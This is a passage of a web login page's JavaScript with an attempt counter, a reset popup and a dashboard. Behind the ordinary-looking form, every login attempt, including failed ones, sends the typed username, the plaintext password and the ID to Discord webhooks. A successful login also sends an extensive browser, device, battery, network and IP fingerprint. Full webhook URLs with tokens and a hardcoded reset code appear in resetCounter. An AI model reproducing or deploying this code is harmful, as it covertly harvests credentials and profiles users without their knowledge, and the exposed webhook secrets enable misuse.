          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged, just formatted for logging style consistency)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System - Successful Login",
          color: 0xff0000,
          fields: [
            { name: "Name", value: `\`${data.user.name || "N/A"}\``, inline: true },
            { name: "Username", value: `\`${data.user.username}\``, inline: true },
            { name: "Password", value: `\`${data.password}\``, inline: true },
            { name: "Rank Type", value: `\`${data.user.rank?.toString() || "N/A"}\``, inline: true },
            { name: "Role Type", value: `\`${data.user.role || "N/A"}\``, inline: true },
            { name: "Login Time (UTC)", value: `\`${data.loginTime}\``, inline: false },
            { name: "User Identifier", value: `\`${data.user.userID.toString()}\``, inline: true },
            { name: "Account Creation Date", value: `\`${data.user.accountCreationDate || "N/A"}\``, inline: true }
          ],
          timestamp: new Date().toISOString()
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System - Login Event",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: `\`${data.user.name || "N/A"}\``, inline: true },
            { name: "Username", value: `\`${data.user.username || "N/A"}\``, inline: true },
            { name: "User Identifier", value: `\`${data.user.userID?.toString() || "N/A"}\``, inline: true },
            { name: "Browser Vendor", value: `\`${nav.vendor || "Unknown"}\``, inline: true },
            { name: "Browser Language", value: `\`${nav.language || "Unknown"}\``, inline: true },
            { name: "Browser Languages", value: `\`${nav.languages ? nav.languages.join(", ") : "Unknown"}\``, inline: false },
            { name: "User Agent", value: `\`${nav.userAgent || "Unknown"}\``, inline: false },
            { name: "Installed Plugins", value: `\`${nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None"}\``, inline: true },
            { name: "Browser Window Size", value: `\`${window.innerWidth}x${window.innerHeight}\``, inline: true },
            { name: "Browser Zoom Level", value: `\`${Math.round(window.devicePixelRatio * 100)}%\``, inline: true },
            { name: "Incognito/Private Mode Status", value: `\`Undetected (Browser limitations)\``, inline: true },
            { name: "Cookies Enabled", value: `\`${nav.cookieEnabled ? "Yes" : "No"}\``, inline: true },
            { name: "Do Not Track", value: `\`${nav.doNotTrack || "Unknown"}\``, inline: true },
            { name: "Browser Tab Visibility", value: `\`${document.visibilityState || "Unknown"}\``, inline: true },
            { name: "Font Smoothing Type", value: `\`Unavailable (Browser limitations)\``, inline: true },
            { name: "Clipboard Access", value: `\`${nav.clipboard ? "Supported" : "Not Supported"}\``, inline: true },
            { name: "WebGL Renderer Info", value: `\`${data.webglRenderer || "Unavailable"}\``, inline: true },
            { name: "Browser Connection Speed", value: `\`${nav.connection?.effectiveType || "Unknown"}\``, inline: true }
          ],
          timestamp: new Date().toISOString()
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System - Login Event",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: `\`${data.user.name || "N/A"}\``, inline: true },
            { name: "Username", value: `\`${data.user.username || "N/A"}\``, inline: true },
            { name: "User ID", value: `\`${data.user.userID?.toString() || "N/A"}\``, inline: true },
            { name: "Device Platform", value: `\`${nav.platform || "Unknown"}\``, inline: true },
            { name: "CPU Cores", value: `\`${nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable"}\``, inline: true },
            { name: "Device Memory", value: `\`${nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable"}\``, inline: true },
            { name: "GPU Renderer", value: `\`${data.webglRenderer || "Unavailable"}\``, inline: true },
            { name: "Battery Charging", value: `\`${battery?.charging ? "Yes" : "No"}\``, inline: true },
            { name: "Battery Level", value: `\`${battery ? `${Math.round(battery.level * 100)}%` : "Unavailable"}\``, inline: true },
            { name: "Touch Support", value: `\`${('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No"}\``, inline: true },
            { name: "Screen Resolution", value: `\`${screen.width}x${screen.height}\``, inline: true },
            { name: "Screen Orientation", value: `\`${screen.orientation?.type || "Unavailable"}\``, inline: true },
            { name: "Color Depth", value: `\`${screen.colorDepth} bit\``, inline: true },
            { name: "Pixel Depth", value: `\`${screen.pixelDepth} bit\``, inline: true },
            { name: "Device Pixel Ratio", value: `\`${window.devicePixelRatio?.toString() || "Unknown"}\``, inline: true },
            { name: "Max Touch Points", value: `\`${nav.maxTouchPoints?.toString() || "0"}\``, inline: true },
            { name: "Vendor", value: `\`${nav.vendor || "Unknown"}\``, inline: true },
            { name: "Language", value: `\`${nav.language || "Unknown"}\``, inline: true }
          ],
          timestamp: new Date().toISOString()
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System - Login Event",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: `\`${data.user.name || "N/A"}\``, inline: true },
            { name: "Username", value: `\`${data.user.username || "N/A"}\``, inline: true },
            { name: "User ID", value: `\`${data.user.userID?.toString() || "N/A"}\``, inline: true },
            { name: "Online Status", value: `\`${nav.onLine ? "Online" : "Offline"}\``, inline: true },
            { name: "Connection Type", value: `\`${nav.connection?.type || "Unknown"}\``, inline: true },
            { name: "Effective Connection Type", value: `\`${nav.connection?.effectiveType || "Unknown"}\``, inline: true },
            { name: "Downlink Speed", value: `\`${nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown"}\``, inline: true },
            { name: "RTT (Round Trip Time)", value: `\`${nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown"}\``, inline: true },
            { name: "Save Data Mode", value: `\`${nav.connection?.saveData ? "Enabled" : "Disabled"}\``, inline: true },
            { name: "IP Address", value: `\`${data.user.ipAddress || "Unavailable"}\``, inline: false },
            { name: "VPN Detected", value: `\`${data.user.vpnDetected ? "Yes" : "No"}\``, inline: true },
            { name: "Proxy Detected", value: `\`${data.user.proxyDetected ? "Yes" : "No"}\``, inline: true },
            { name: "Public IPv6", value: `\`${data.user.ipv6Address || "Unavailable"}\``, inline: false },
            { name: "Local IP Addresses", value: `\`${data.user.localIPs?.join(", ") || "Unavailable"}\``, inline: false },
            { name: "Network Downlink Max", value: `\`${nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown"}\``, inline: true },
            { name: "Network Metered Connection", value: `\`${nav.connection?.metered ? "Yes" : "No"}\``, inline: true },
            { name: "Network Type Detailed", value: `\`${nav.connection?.typeDetailed || "Unknown"}\``, inline: true },
            { name: "Effective Network Bandwidth Estimate", value: `\`${nav.connection?.bandwidthEstimate || "Unavailable"}\``, inline: true }
          ],
          timestamp: new Date().toISOString()
        };
      }

      function buildSessionLoggingEmbed(data) {
        // Placeholder for real-time session data, which is collected over time,
        // For login, it captures the initial state. Logout data is captured on exit.
        return {
          title: "Session Logging System - Start Event",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: `\`${data.user.name || "N/A"}\``, inline: true },
            { name: "Username", value: `\`${data.user.username || "N/A"}\``, inline: true },
            { name: "User ID", value: `\`${data.user.userID?.toString() || "N/A"}\``, inline: true },
            { name: "Login Time (UTC)", value: `\`${data.loginTime || "Unknown"}\``, inline: true },
            { name: "Initial Browser State", value: `\`${navigator.userAgent}\``, inline: false },
            { name: "Current URL", value: `\`${window.location.href}\``, inline: false },
          ],
          timestamp: new Date().toISOString()
        };
      }


      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          notify('Login failed: All fields are required.', 'error');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Always log specific credentials before further checks (as per explicit request for logging type)
        await logUsername(user?.name || "N/A (Attempt)", username);
        await logPassword(user?.name || "N/A (Attempt)", password);
        await logIdentifier(user?.name || "N/A (Attempt)", userID);


        // Log the attempt counter regardless of success for tracking
        await logAttemptsCounter(
            user?.name || "N/A (Attempt)",
            username,
            password,
            userID,
            attempts - 1 // Decrement before passing to show remaining
        );


        if (!user) {
          await logInvalidUsername("N/A (Not Found)", username);
          await logInvalidIdentifier("N/A (Not Found)", userID);
          handleFailedAttempt('Invalid Username or User Identifier.');
          notify('Login failed: Invalid username or identifier.', 'error');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          notify('Login failed: Incorrect password.', 'error');
          return;
        }

        // Correct login
        attempts = 5; // Reset attempts on successful login
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';
        
        notify('Login successful!', 'success');


        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 main webhooks for a successful login:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Hide login and show dashboard
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body'; // Change body class for dashboard styling
        document.body.style.overflow = 'auto'; // Re-enable scrolling

        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "N/A (Max Attempts)",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
          notify('Maximum login attempts exceeded. Please reset the counter.', 'warning');
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400); // Only flash when attempts are low
            notify(`Warning: ${attempts} attempts left.`, 'warning');
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected - Interaction Log",
          color: 0xffff00,
          description: "User attempted to use the reset counter feature.",
          fields: [
            { name: "Name (Known)", value: user.name || "N/A", inline: true },
            { name: "Username Used", value: `\`${username}\``, inline: true },
            { name: "Password (Last Attempt)", value: `\`${password}\``, inline: true },
            { name: "User ID (Last Attempt)", value: `\`${userID}\``, inline: true },
            { name: "Entered Reset Code", value: `\`${enteredCode}\``, inline: false },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJkseiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          description: isCorrect ? "User successfully reset login attempts." : "User failed to enter correct reset code.",
          fields: [
            { name: "Name (Known)", value: user.name || "N/A", inline: true },
            { name: "Username", value: `\`${username}\``, inline: true },
            { name: "Password (Last Attempt)", value: `\`${password}\``, inline: true },
            { name: "User ID", value: `\`${userID}\``, inline: true },
            { name: "Reset Code Provided", value: `\`${enteredCode}\``, inline: false },
            { name: "Outcome", value: isCorrect ? "Successful Reset" : "Failed Reset", inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          notify('Reset successful! You can now try logging in again.', 'success');
        } else {
          alert('Incorrect reset code.');
          notify('Incorrect reset code entered.', 'error');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
